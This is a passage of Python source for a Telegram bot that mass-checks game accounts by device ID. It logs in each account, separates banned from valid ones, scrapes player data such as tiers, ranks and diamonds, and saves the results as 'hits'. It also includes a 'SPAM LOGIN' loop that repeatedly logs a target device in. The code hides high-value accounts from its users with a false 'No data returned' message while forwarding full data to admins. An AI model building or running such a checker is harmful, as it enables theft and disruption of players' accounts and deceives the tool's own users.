        await update.message.reply_text("Check PAUSED.", reply_markup=kb_check_paused())
        return

    if text == "RESUME":
        jid = ctx.user_data.get("active_job")
        if not jid:
            await update.message.reply_text("No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        job_set_state(jid, "running")
        await update.message.reply_text("Check RESUMED.", reply_markup=kb_check_running())
        return

    if text == "STOP CHECK":
        jid = ctx.user_data.get("active_job")
        if not jid:
            await update.message.reply_text("No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        job_set_state(jid, "stopped")
        await update.message.reply_text(
            "STOPPING...\nCurrent data will be sent shortly.",
            reply_markup=kb_main(uid in ADMIN_IDS)
        )
        return

    if text == "BACK":
        ctx.user_data["menu"] = "main"
        for k in ("pending_accounts", "await_single", "await_file", "await_paste",
                  "await_spam_device", "await_delete_id", "clean_stats"):
            ctx.user_data.pop(k, None)
        await update.message.reply_text("Main menu:", reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "CANCEL":
        ctx.user_data["menu"] = "main"
        ctx.user_data["spam_running"] = False
        for k in ("pending_accounts", "await_single", "await_file", "await_paste",
                  "await_spam_device", "await_delete_id", "clean_stats"):
            ctx.user_data.pop(k, None)
        await update.message.reply_text("Cancelled. Main menu:",
                                        reply_markup=kb_main(uid in ADMIN_IDS))
        return

    if text == "HELP":
        await update.message.reply_text(
            f"{BOT_NAME} BOT - Help\n"
            f"DEVELOPER - {DEVELOPER}\n\n"
            "4STEP CHECK: Upload txt file. Bot runs:\n"
            "  1. CLEAN\n"
            "  2. BANNED CHECK\n"
            "  3. VALID CHECK\n"
            "  4. INFO CHECK\n\n"
            "PAUSE / RESUME / STOP available.\n"
            "SINGLE CHECK: Enter one Device ID\n"
            "SPAM LOGIN: Repeatedly login a Device ID\n"
            "FILES: Manage database, select tier files\n"
            "STATISTICS: View your breakdown (incl. offline days)",
            reply_markup=kb_main(uid in ADMIN_IDS)
        )
        return

    if text == "4STEP CHECK":
        ctx.user_data["menu"] = "4step"
        await update.message.reply_text(
            "4STEP CHECK\n\n"
            "Upload a .txt file. Bot will run:\n"
            "  STEP 1: CLEAN\n"
            "  STEP 2: BANNED CHECK\n"
            "  STEP 3: VALID CHECK\n"
            "  STEP 4: INFO CHECK\n\n"
            "Or paste lines manually.",
            reply_markup=kb_4step()
        )
        return

    if text == "SINGLE CHECK":
        ctx.user_data["menu"] = "single"
        ctx.user_data["await_single"] = True
        await update.message.reply_text(
            "SINGLE CHECK\n\nSend one Device ID (e.g. and_xxxxxx)",
            reply_markup=kb_single()
        )
        return

    if text == "SPAM LOGIN":
        ctx.user_data["menu"] = "spam"
        await update.message.reply_text(
            "SPAM LOGIN\n\nPress START SPAM, then send Device ID.\nPress STOP SPAM to stop.",
            reply_markup=kb_spam()
        )
        return

    if text == "FILES":
        ctx.user_data["menu"] = "files"
        await update.message.reply_text("FILES\n\nManage your saved hits.",
                                        reply_markup=kb_files())
        return

    if text == "STATISTICS":
        ctx.user_data["menu"] = "stats"
        await update.message.reply_text("STATISTICS\n\nChoose a breakdown.",
                                        reply_markup=kb_stats())
        return

    if text == "ADMIN PANEL":
        if uid not in ADMIN_IDS:
            await update.message.reply_text("Not authorized.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        ctx.user_data["menu"] = "admin"
        await update.message.reply_text("ADMIN PANEL", reply_markup=kb_admin())
        return

    if menu == "tier_select":
        await handle_tier_selection_text(update, ctx, uid, text)
        return

    if menu == "4step":
        if text == "UPLOAD FILE":
            ctx.user_data["await_file"] = True
            await update.message.reply_text("Send .txt file now.",
                                            reply_markup=kb_cancel())
            return
        if text == "PASTE MANUAL":
            ctx.user_data["await_paste"] = True
            await update.message.reply_text(
                "Paste lines now (one per line):\n\n"
                "Device id: and_xxx | account id: 123 | zone id: 456",
                reply_markup=kb_cancel()
            )
            return
        if ctx.user_data.get("await_paste"):
            cleaned, stats = clean_device_ids_from_text(text, keep_only_ids=False)
            if not cleaned:
                await update.message.reply_text(
                    "No valid Device ID found. Format:\n"
                    "Device id: and_xxx | account id: 123 | zone id: 456",
                    reply_markup=kb_cancel()
                )
                return
            ctx.user_data["await_paste"] = False
            ctx.user_data["pending_accounts"] = cleaned
            ctx.user_data["clean_stats"] = stats
            preview = build_cleaned_txt(cleaned)
            preview_msg = (
                "STEP 1/4 CLEAN — DONE\n\n"
                f"Raw lines: {stats['raw_lines']}\n"
                f"Full match: {stats['found_full']}\n"
                f"ID only: {stats['found_id_only']}\n"
                f"Duplicates: {stats['duplicates']}\n"
                f"Unique: {stats['unique']}"
            )
            user_dir = USERS_DIR / str(uid)
            user_dir.mkdir(exist_ok=True)
            fp = user_dir / f"cleaned_{int(time.time())}.txt"
            with open(fp, "w", encoding="utf-8") as f:
                f.write(preview)
            await update.message.reply_text(preview_msg)
            await update.message.reply_document(document=open(fp, "rb"),
                                                caption=f"Cleaned ({stats['unique']})")
            try:
                os.remove(fp)
            except Exception:
                pass
            await update.message.reply_text(
                f"Type CONFIRM START to begin check, or CANCEL.",
                reply_markup=kb_confirm_start()
            )
            return

    if text == "CONFIRM START":
        accounts = ctx.user_data.get("pending_accounts")
        if not accounts:
            await update.message.reply_text("Nothing to confirm.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return

        parsed = []
        for item in accounts:
            dev = item.get("device")
            rid = item.get("role_id")
            zid = item.get("zone_id")
            parsed.append({
                "Device id": dev,
                "role_id": int(rid) if rid else None,
                "zone_id": int(zid) if zid else None,
            })

        ctx.user_data["menu"] = "checking"
        await update.message.reply_text(
            f"Starting 4-step check on {len(parsed)} entries.\n\n"
            f"PAUSE / RESUME / STOP available.",
            reply_markup=kb_check_running()
        )
        asyncio.create_task(run_4step_task(update.effective_chat.id, ctx, uid, parsed))
        ctx.user_data.pop("pending_accounts", None)
        ctx.user_data.pop("clean_stats", None)
        return

    if ctx.user_data.get("await_single"):
        if not text.startswith(("and_", "ios_")):
            await update.message.reply_text("Invalid Device ID.",
                                            reply_markup=kb_single())
            return
        ctx.user_data["await_single"] = False
        await update.message.reply_text("Checking...", reply_markup=kb_back_only())
        ok, result = await asyncio.to_thread(do_single_check_full, uid, text)
        if not ok:
            await update.message.reply_text(f"Failed: {result}",
                                            reply_markup=kb_single())
            return
        await send_result_by_tier(update.effective_chat.id, ctx, uid, result, source="single")
        return

    if menu == "spam":
        if text == "START SPAM":
            ctx.user_data["await_spam_device"] = True
            await update.message.reply_text("Send Device ID to spam.",
                                            reply_markup=kb_cancel())
            return
        if text == "STOP SPAM":
            ctx.user_data["spam_running"] = False
            await update.message.reply_text("Spam stopped.", reply_markup=kb_spam())
            return
        if ctx.user_data.get("await_spam_device"):
            if not text.startswith(("and_", "ios_")):
                await update.message.reply_text("Invalid Device ID.",
                                                reply_markup=kb_cancel())
                return
            ctx.user_data["await_spam_device"] = False
            ctx.user_data["spam_running"] = True
            ctx.user_data["spam_device"] = text
            asyncio.create_task(spam_loop(update.effective_chat.id, ctx, uid, text))
            await update.message.reply_text(
                f"Spam started for {text}\nPress STOP SPAM to stop.",
                reply_markup=kb_spam()
            )
            return

    if menu == "files":
        if text == "LIST HITS":
            await send_hits_list(update, ctx, uid)
            return
        if text == "DOWNLOAD ALL HITS":
            await send_hits_file(update, ctx, uid)
            return
        if text == "SELECT TIER FILES":
            await start_tier_selection(update, ctx, uid)
            return
        if text == "DOWNLOAD ALL TIER FILES":
            await send_tier_zip_all(update, ctx, uid)
            return
        if text == "DELETE HIT BY ID":
            ctx.user_data["await_delete_id"] = True
            await update.message.reply_text("Send hit ID to delete (e.g. 5)",
                                            reply_markup=kb_cancel())
            return
        if text == "CLEAR ALL HITS":
            await update.message.reply_text(
                "Delete ALL your hits? Type CONFIRM_CLEAR to proceed.",
                reply_markup=kb_confirm_clear()
            )
            return
        if ctx.user_data.get("await_delete_id"):
            ctx.user_data["await_delete_id"] = False
            try:
                hid = int(text.strip())
            except ValueError:
                await update.message.reply_text("Invalid ID.", reply_markup=kb_files())
                return
            db_delete_hit(hid, uid)
            await update.message.reply_text(f"Deleted hit #{hid}.", reply_markup=kb_files())
            return

    if text == "CONFIRM_CLEAR":
        db_clear_user_hits(uid)
        await update.message.reply_text("All your hits cleared.", reply_markup=kb_files())
        return

    if menu == "stats":
        if text == "TIER BREAKDOWN":
            await send_tier_breakdown(update, ctx, uid)
            return
        if text == "RANK BREAKDOWN":
            await send_rank_breakdown(update, ctx, uid)
            return
        if text == "V2L BREAKDOWN":
            await send_v2l_breakdown(update, ctx, uid)
            return
        if text == "OFFLINE BREAKDOWN":
            await send_offline_breakdown_stats(update, ctx, uid)
            return
        if text == "FULL SUMMARY":
            await send_full_summary(update, ctx, uid)
            return

    if menu == "admin" and uid in ADMIN_IDS:
        if text == "DOWNLOAD DB":
            if os.path.isfile(DB_PATH):
                await update.message.reply_document(document=open(DB_PATH, "rb"),
                                                    caption="Database file",
                                                    reply_markup=kb_admin())
            return
        if text == "USER LIST":
            with _db_lock, sqlite3.connect(DB_PATH) as c:
                rows = c.execute("SELECT user_id, username, first_seen, last_seen FROM users ORDER BY last_seen DESC LIMIT 50").fetchall()
            lines = ["User List (latest 50):\n"]
            for uid_, uname, fs, ls in rows:
                lines.append(f"{uid_} | @{uname or '-'} | {format_timestamp(ls)}")
            await update.message.reply_text("\n".join(lines), reply_markup=kb_admin())
            return

    await update.message.reply_text("Unknown command. Use the keyboard buttons.",
                                    reply_markup=kb_main(uid in ADMIN_IDS))


# ======================================================================
#  DOCUMENT HANDLER
# ======================================================================
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        return

    if not ctx.user_data.get("await_file"):
        await update.message.reply_text(
            "Choose 4STEP CHECK > UPLOAD FILE first.",
            reply_markup=kb_main(uid in ADMIN_IDS)
        )
        return

    doc = update.message.document if update.message else None
    if not doc:
        await update.message.reply_text(
            "No document found. Please send a .txt file.",
            reply_markup=kb_cancel()
        )
        return

    fname = (doc.file_name or "").strip()
    if not fname:
        await update.message.reply_text(
            "File has no name. Please rename and resend as .txt file.",
            reply_markup=kb_cancel()
        )
        return

    if not fname.lower().endswith(".txt"):
        await update.message.reply_text(
            "Only .txt files accepted.",
            reply_markup=kb_cancel()
        )
        return

    try:
        file_size = int(getattr(doc, "file_size", 0) or 0)
        if file_size > 20 * 1024 * 1024:
            await update.message.reply_text(
                "File too large (max 20 MB).",
                reply_markup=kb_cancel()
            )
            return
    except Exception:
        pass

    try:
        f = await doc.get_file()
    except Exception as e:
        await update.message.reply_text(
            f"Could not fetch file: {type(e).__name__}",
            reply_markup=kb_cancel()
        )
        return

    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True, parents=True)
    input_fp = user_dir / f"input_{int(time.time())}.txt"

    try:
        await f.download_to_drive(str(input_fp))
    except Exception as e:
        await update.message.reply_text(
            f"Download failed: {type(e).__name__}",
            reply_markup=kb_cancel()
        )
        return

    try:
        content = input_fp.read_text(encoding="utf-8", errors="ignore")
    except Exception:
        await update.message.reply_text("Failed to read file.", reply_markup=kb_cancel())
        try:
            os.remove(input_fp)
        except Exception:
            pass
        return

    cleaned, stats = clean_device_ids_from_text(content, keep_only_ids=False)
    if not cleaned:
        await update.message.reply_text(
            "No valid Device ID found in file.\n\n"
            "Format required:\n"
            "Device id: and_xxx | account id: 123 | zone id: 456",
            reply_markup=kb_cancel()
        )
        try:
            os.remove(input_fp)
        except Exception:
            pass
        return

    ctx.user_data["await_file"] = False
    ctx.user_data["pending_accounts"] = cleaned
    ctx.user_data["clean_stats"] = stats

    cleaned_txt = build_cleaned_txt(cleaned)
    cleaned_fp = user_dir / f"cleaned_{int(time.time())}.txt"
    try:
        with open(cleaned_fp, "w", encoding="utf-8") as fh:
            fh.write(cleaned_txt)
    except Exception:
        pass

    await update.message.reply_text(
        "STEP 1/4 CLEAN — DONE\n\n"
        f"Raw lines: {stats['raw_lines']}\n"
        f"Full match: {stats['found_full']}\n"
        f"Only Device ID: {stats['found_id_only']}\n"
        f"Duplicates: {stats['duplicates']}\n"
        f"Unique entries: {stats['unique']}"
    )

    if cleaned_fp.exists():
        try:
            await update.message.reply_document(
                document=open(cleaned_fp, "rb"),
                caption=f"Cleaned file ({stats['unique']} entries)"
            )
        except Exception:
            pass
        try:
            os.remove(cleaned_fp)
        except Exception:
            pass

    try:
        os.remove(input_fp)
    except Exception:
        pass

    await update.message.reply_text(
        f"Detected {len(cleaned)} valid entries after cleaning.\n"
        f"Type CONFIRM START to begin check, or CANCEL.",
        reply_markup=kb_confirm_start()
    )


# ======================================================================
#  4-STEP PIPELINE  —  PROGRESS BAR ONLY
# ======================================================================
async def run_4step_task(chat_id, ctx, uid, accounts):
    app = ctx.application
    jid = job_new(uid)
    job_update(jid, step=1, step_name="CLEAN", total=len(accounts))
    ctx.user_data["active_job"] = jid

    # Send only progress bar
    live_msg = await app.bot.send_message(
        chat_id=chat_id,
        text=render_progress_only(job_get(jid) or {}),
        reply_markup=kb_check_running()
    )

    last_bar = {"text": render_progress_only(job_get(jid) or {})}
    stop_flag = {"stop": False}

    async def live_updater():
        try:
            await asyncio.sleep(0.5)
            while not stop_flag["stop"]:
                j = job_get(jid)
                if not j:
                    break
                bar_text = render_progress_only(j)
                if bar_text != last_bar["text"]:
                    last_bar["text"] = bar_text
                    try:
                        await live_msg.edit_text(bar_text)
                    except Exception:
                        pass
                if j["state"] == "stopped":
                    break
                if j["step"] >= 4 and j["done"] >= j["total"] and j["total"] > 0:
                    break
                await asyncio.sleep(0.8)
        except asyncio.CancelledError:
            return
        except Exception:
            return

    updater_task = asyncio.create_task(live_updater())

    def _gate():
        while True:
            j = job_get(jid)
            if not j:
                return False
            if j["state"] == "stopped":
                return False
            if j["state"] == "paused":
                time.sleep(1.0)
                continue
            return True

    # STEP 1: CLEAN
    job_update(jid, step=1, step_name="CLEAN")
    job_inc_count(jid, "clean", len(accounts))
    job_set_total(jid, len(accounts))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.4)

    # STEP 2: BANNED CHECK
    job_update(jid, step=2, step_name="BANNED CHECK")
    job_set_total(jid, len(accounts))
    await asyncio.sleep(0.4)

    banned = []
    cleared = []
    s2_lock = threading.Lock()

    def worker_ban(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        try:
            status, reason, retry = _ban_check_one(dev)
            if status == "UNKNOWN" and retry:
                time.sleep(0.5)
                status, reason, retry = _ban_check_one(dev)
        except Exception:
            status = "UNKNOWN"
            reason = "EXC"
        with s2_lock:
            if status == "BANNED":
                banned.append({
                    "Device id": dev,
                    "role_id": acc.get("role_id"),
                    "zone_id": acc.get("zone_id"),
                    "reason": reason,
                })
                job_inc_count(jid, "banned")
            elif status == "CLEAR":
                cleared.append(acc)
            else:
                cleared.append(acc)
        job_inc(jid)
        time.sleep(0.05)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        list(ex.map(worker_ban, accounts))

    # STEP 3: VALID CHECK
    job_update(jid, step=3, step_name="VALID CHECK")
    job_set_total(jid, len(cleared))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.4)

    valid_accounts = []
    s3_lock = threading.Lock()

    def worker_valid(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        rid = acc.get("role_id")
        zid = acc.get("zone_id")
        if rid and zid:
            with s3_lock:
                valid_accounts.append({
                    "device": dev,
                    "role_id": int(rid),
                    "zone_id": int(zid),
                })
                job_inc_count(jid, "valid")
            job_inc(jid)
            return
        try:
            with GameConnection(device_id=dev) as conn:
                a_id = conn.account_id
                z_id = conn.zone_id
            if a_id and z_id:
                with s3_lock:
                    valid_accounts.append({
                        "device": dev,
                        "role_id": a_id,
                        "zone_id": z_id,
                    })
                    job_inc_count(jid, "valid")
            else:
                job_inc_count(jid, "errors")
        except Exception:
            job_inc_count(jid, "errors")
        job_inc(jid)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        list(ex.map(worker_valid, cleared))

    # STEP 4: INFO CHECK
    job_update(jid, step=4, step_name="INFO CHECK")
    job_set_total(jid, len(valid_accounts))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.4)

    valid = []
    errors = []
    s4_lock = threading.Lock()

    def worker_info(acc):
        if not _gate():
            return
        dev = acc["device"]
        rid = acc["role_id"]
        zid = acc["zone_id"]
        result = None
        last_err = "UNKNOWN"
        for attempt in range(3):
            if not _gate():
                return
            try:
                result = lookup_player_data(dev, rid, zid)
                if result and result.get("status") == "success":
                    break
                last_err = result.get("error", "UNKNOWN") if result else "NO_RESULT"
            except Exception as e:
                last_err = f"EXC:{type(e).__name__}"
                result = None
            time.sleep(1.0)

        if result and result.get("status") == "success":
            pd = result.get("player_data", {})
            with s4_lock:
                valid.append(({
                    "Device id": dev,
                    "role_id": rid,
                    "zone_id": zid,
                }, pd))
                job_inc_count(jid, "info")
            try:
                db_insert_hit(uid, pd, dev, rid, zid, source="4step")
            except Exception:
                pass
        else:
            with s4_lock:
                errors.append((acc, last_err))
                job_inc_count(jid, "errors")
        job_inc(jid)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        list(ex.map(worker_info, valid_accounts))

    # FINISH
    stop_flag["stop"] = True
    try:
        updater_task.cancel()
    except Exception:
        pass

    was_stopped = job_is_stopped(jid)

    final_state = job_get(jid) or {}
    if not final_state:
        final_state = {
            "step": 4, "step_name": "INFO CHECK",
            "done": len(accounts), "total": len(accounts),
            "counts": {
                "clean": len(accounts),
                "banned": len(banned),
                "valid": len(valid_accounts),
                "info": len(valid),
                "errors": len(errors),
            },
            "state": "stopped" if was_stopped else "completed",
        }

    # Final bar only
    final_bar = render_progress_only(final_state)
    try:
        await live_msg.edit_text(final_bar)
    except Exception:
        try:
            await app.bot.send_message(chat_id=chat_id, text=final_bar)
        except Exception:
            pass

    job_finish(jid)
    ctx.user_data.pop("active_job", None)

    summary = (f"Clean: {len(accounts)}\n"
               f"Banned: {len(banned)}\n"
               f"Valid: {len(valid_accounts)}\n"
               f"Info: {len(valid)}\n"
               f"Errors: {len(errors)}\n"
               f"Stopped: {was_stopped}")
    try:
        db_insert_check(uid, "4step", len(accounts), len(valid), len(banned), len(errors), summary)
    except Exception:
        pass

    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    ts = int(time.time())

    # User-visible filtering: hide World Collector & above
    user_visible = []
    for acc, pd in valid:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if not _is_hidden_tier_user(base):
            user_visible.append((acc, pd))

    status_word = "STOPPED" if was_stopped else "DONE"

    visible_players = [pd for acc, pd in user_visible]
    offline_text = _render_offline_breakdown(visible_players)

    lines = [
        f"4STEP CHECK {status_word}",
        "=====================",
        f"Clean       : {len(accounts)}",
        f"Banned      : {len(banned)}",
        f"Valid       : {len(valid_accounts)}",
        f"Info hits   : {len(user_visible)}",
        f"Errors      : {len(errors)}",
        "",
        offline_text,
    ]
    try:
        await app.bot.send_message(chat_id=chat_id, text="\n".join(lines))
    except Exception:
        pass

    if user_visible:
        vfp = user_dir / f"visible_{ts}.txt"
        with open(vfp, "w", encoding="utf-8") as f:
            for acc, pd in user_visible:
                f.write(build_hit_txt(acc.get("Device id", ""),
                                      acc.get("role_id") or 0,
                                      acc.get("zone_id") or 0, pd) + "\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(vfp, "rb"),
                                         caption=f"Valid hits ({len(user_visible)})")
        except Exception:
            pass
        try:
            os.remove(vfp)
        except Exception:
            pass

    # Admin files (full data)
    if valid or banned or errors:
        for admin_id in ADMIN_IDS:
            try:
                afp = user_dir / f"admin_{ts}.txt"
                with open(afp, "w", encoding="utf-8") as f:
                    f.write(f"USER: {uid}\n")
                    f.write(f"STATUS: {status_word}\n")
                    f.write(f"CLEAN: {len(accounts)}\n")
                    f.write(f"BANNED: {len(banned)}\n")
                    f.write(f"VALID: {len(valid_accounts)}\n")
                    f.write(f"INFO: {len(valid)}\n")
                    f.write(f"ERRORS: {len(errors)}\n\n")
                    if valid:
                        f.write("=" * 60 + "\nINFO HITS:\n" + "=" * 60 + "\n\n")
                        for acc, pd in valid:
                            f.write(build_hit_txt(acc.get("Device id", ""),
                                                  acc.get("role_id") or 0,
                                                  acc.get("zone_id") or 0, pd) + "\n\n")
                    f.write("\n" + "=" * 60 + "\nOFFLINE BREAKDOWN:\n" + "=" * 60 + "\n\n")
                    f.write(_render_offline_breakdown([pd for acc, pd in valid]) + "\n")
                await app.bot.send_document(
                    chat_id=admin_id,
                    document=open(afp, "rb"),
                    caption=(f"ADMIN - INFO {status_word}\n"
                             f"User: {uid}\n"
                             f"Clean: {len(accounts)} | Banned: {len(banned)} | "
                             f"Valid: {len(valid_accounts)} | Info: {len(valid)}")
                )
                try:
                    os.remove(afp)
                except Exception:
                    pass

                if banned:
                    bfp = user_dir / f"admin_banned_{ts}.txt"
                    with open(bfp, "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write(f"BANNED ACCOUNTS: {len(banned)}\n")
                        f.write(f"USER: {uid}\n")
                        f.write(f"STATUS: {status_word}\n")
                        f.write("=" * 60 + "\n\n")
                        for i, acc in enumerate(banned, 1):
                            dev = acc.get("Device id", "N/A")
                            rid = acc.get("role_id") or "N/A"
                            zid = acc.get("zone_id") or "N/A"
                            reason = acc.get("reason", "")
                            f.write(f"{i}. {dev}\n")
                            f.write(f"   Account ID: {rid}\n")
                            f.write(f"   Zone ID   : {zid}\n")
                            if reason:
                                f.write(f"   Reason    : {reason}\n")
                            f.write("\n")
                    await app.bot.send_document(
                        chat_id=admin_id,
                        document=open(bfp, "rb"),
                        caption=f"ADMIN - BANNED ({len(banned)})"
                    )
                    try:
                        os.remove(bfp)
                    except Exception:
                        pass

                if errors:
                    efp = user_dir / f"admin_errors_{ts}.txt"
                    with open(efp, "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write(f"ERRORS: {len(errors)}\n")
                        f.write(f"USER: {uid}\n")
                        f.write(f"STATUS: {status_word}\n")
                        f.write("=" * 60 + "\n\n")
                        err_types = Counter()
                        for acc, err in errors:
                            err_str = str(err)[:80]
                            err_types[err_str] += 1
                        f.write("--- ERROR BREAKDOWN ---\n\n")
                        for etype, cnt in err_types.most_common(20):
                            f.write(f"  [{cnt}] {etype}\n")
                        f.write("\n--- ERROR DETAILS ---\n\n")
                        for i, (acc, err) in enumerate(errors, 1):
                            dev = acc.get("Device id", acc.get("device", "N/A"))
                            rid = acc.get("role_id") or "N/A"
                            zid = acc.get("zone_id") or "N/A"
                            f.write(f"{i}. {dev}\n")
                            f.write(f"   Account ID: {rid}\n")
                            f.write(f"   Zone ID   : {zid}\n")
                            f.write(f"   Error     : {err}\n\n")
                    await app.bot.send_document(
                        chat_id=admin_id,
                        document=open(efp, "rb"),
                        caption=f"ADMIN - ERRORS ({len(errors)})"
                    )
                    try:
                        os.remove(efp)
                    except Exception:
                        pass
            except Exception:
                pass

    try:
        await app.bot.send_message(
            chat_id=chat_id, text="Ready.",
            reply_markup=kb_main(uid in ADMIN_IDS)
        )
    except Exception:
        pass


# ======================================================================
#  SINGLE CHECK
# ======================================================================
def do_single_check_full(uid, device_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            acc_id = conn.account_id
            zone_id = conn.zone_id
            if not acc_id or not zone_id:
                return False, "NO_ACCOUNT"
        result = lookup_player_data(device_id, acc_id, zone_id)
        if result.get("status") != "success":
            return False, result.get("error", "UNKNOWN")
        pd = result.get("player_data", {})
        db_insert_hit(uid, pd, device_id, acc_id, zone_id, source="single")
        return True, {
            "device_id": device_id,
            "role_id": acc_id,
            "zone_id": zone_id,
            "pd": pd,
        }
    except Exception as e:
        return False, f"EXC:{type(e).__name__}"


async def send_result_by_tier(chat_id, ctx, uid, result, source="single"):
    pd = result["pd"]
    dev = result["device_id"]
    rid = result["role_id"]
    zid = result["zone_id"]
    base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
    is_hidden = _is_hidden_tier_user(base)
    app = ctx.application
    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    ts = int(time.time())
    txt = build_hit_txt(dev, rid, zid, pd)

    if not is_hidden:
        fp = user_dir / f"single_{ts}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(txt)
        await app.bot.send_document(chat_id=chat_id, document=open(fp, "rb"),
                                     caption=f"Result - {pd.get('nickname', 'N/A')}")
        try:
            os.remove(fp)
        except Exception:
            pass
    else:
        await app.bot.send_message(
            chat_id=chat_id,
            text="Check completed. No data returned for this Device ID."
        )

    for admin_id in ADMIN_IDS:
        try:
            ap = user_dir / f"admin_single_{ts}.txt"
            with open(ap, "w", encoding="utf-8") as f:
                f.write(txt)
            await app.bot.send_document(
                chat_id=admin_id, document=open(ap, "rb"),
                caption=f"ADMIN - Single check\nUser: {uid}\nTier: {full}"
            )
            try:
                os.remove(ap)
            except Exception:
                pass
        except Exception:
            pass


# ======================================================================
#  SPAM
# ======================================================================
async def spam_loop(chat_id, ctx, uid, device_id):
    app = ctx.application
    count = 0
    while ctx.user_data.get("spam_running"):
        try:
            with GameConnection(device_id=device_id) as conn:
                if conn.account_id and conn.zone_id:
                    count += 1
                    if count % 10 == 0:
                        await app.bot.send_message(
                            chat_id=chat_id,
                            text=f"Spam running... {count} logins"
                        )
        except Exception:
            pass
        await asyncio.sleep(1)
    try:
        await app.bot.send_message(chat_id=chat_id, text=f"Spam stopped. Total: {count}",
                                    reply_markup=kb_spam())
    except Exception:
        pass


# ======================================================================
#  FILES / STATS
# ======================================================================
async def send_hits_list(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await update.message.reply_text("No hits.", reply_markup=kb_files())
        return
    visible = [r for r in rows if (uid in ADMIN_IDS) or not _is_hidden_tier_user(r[8])]
    lines = [f"Your Hits (latest 20 of {len(visible)}):\n"]
    for r in visible[:20]:
        hid, dev, acc, zone, nick, lvl, skins, tier_full = r[:8]
        lines.append(f"#{hid} | {nick or 'N/A'} | Lv{lvl} | {tier_full or 'No Tier'}")
        lines.append(f"   Device: {dev[:40]}...")
    if not visible:
        lines.append("(all hidden)")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_files())


async def send_hits_file(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await update.message.reply_text("Empty.", reply_markup=kb_files())
        return
    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    fp = user_dir / f"my_hits_{int(time.time())}.txt"
    with open(fp, "w", encoding="utf-8") as f:
        for r in rows:
            (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
             rank, hrank, dia, v2l, ts, src, last_ts) = r
            if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
                continue
            days = _offline_days(last_ts)
            days_str = f"{days} day(s)" if days is not None else "N/A"
            f.write("=" * 60 + "\n")
            f.write(f"Hit #{hid}\nDevice ID: {dev}\nAccount ID: {acc}\nZone ID: {zone}\n")
            f.write(f"Name: {nick}\nLevel: {lvl}\nSkin Count: {skins}\n")
            f.write(f"Collector Tier: {tier_full}\nCurrent Rank: {rank}\nMax Rank: {hrank}\n")
            f.write(f"Diamonds: {dia}\nV2L: {v2l}\n")
            f.write(f"Offline Days: {days_str}\n")
            f.write(f"Date: {format_timestamp(ts)}\n")
            f.write("=" * 60 + "\n\n")
    await update.message.reply_document(document=open(fp, "rb"),
                                        caption="Your hits", reply_markup=kb_files())
    try:
        os.remove(fp)
    except Exception:
        pass


async def start_tier_selection(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await update.message.reply_text("No hits.", reply_markup=kb_files())
        return
    buckets = {}
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        buckets.setdefault(r[7] or "No Tier", []).append(r)
    if not buckets:
        await update.message.reply_text("No visible hits.", reply_markup=kb_files())
        return
    sorted_tiers = sorted(buckets.keys(), key=lambda t: (
        _base_sort_key(_normalize_collector_tier(t)[0]),
        -ROMAN_ORDER.get(_normalize_collector_tier(t)[1], 0)
    ))
    ctx.user_data["pending_tiers"] = {
        "buckets": buckets,
        "sorted_tiers": sorted_tiers,
        "selected": set(),
    }
    ctx.user_data["menu"] = "tier_select"
    lines = ["SELECT TIER FILES\n", "Available tiers:\n"]
    for i, tier in enumerate(sorted_tiers, 1):
        lines.append(f"[{i}] {tier} ({len(buckets[tier])})")
    lines.append("")
    lines.append("Type: 1 | 1,3,5 | 1-5 | SELECT ALL")
    lines.append("Then DONE to download, CANCEL to abort.")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_tier_select())


async def handle_tier_selection_text(update, ctx, uid, text):
    state = ctx.user_data.get("pending_tiers")
    if not state:
        await update.message.reply_text("Session expired.", reply_markup=kb_files())
        ctx.user_data["menu"] = "files"
        return
    tiers = state["sorted_tiers"]
    buckets = state["buckets"]
    selected = state["selected"]

    if text == "CANCEL":
        ctx.user_data.pop("pending_tiers", None)
        ctx.user_data["menu"] = "files"
        await update.message.reply_text("Cancelled.", reply_markup=kb_files())
        return

    if text == "SELECT ALL":
        selected.clear()
        selected.update(tiers)
        await update.message.reply_text(f"Selected ALL {len(tiers)} tiers.\nType DONE.")
        return

    if text == "DONE":
        if not selected:
            await update.message.reply_text("Nothing selected.")
            return
        await perform_tier_download(update, ctx, uid, list(selected))
        ctx.user_data.pop("pending_tiers", None)
